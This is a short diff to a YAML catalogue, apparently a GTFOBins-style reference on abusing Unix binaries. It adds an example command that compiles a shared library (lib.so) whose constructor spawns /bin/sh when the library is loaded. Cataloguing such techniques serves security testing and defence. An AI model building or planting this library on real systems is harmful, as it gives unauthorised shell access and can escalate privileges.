@@ -74,6 +74,14 @@ download:
 library-load:
   label: Library load
   description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
+  extra:
+    payload: |-
+      As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:
+
+      ```
+      echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
+          | gcc -w -fPIC -shared -o lib.so -x c -
+      ```
 
 inherit:
   label: Inherit
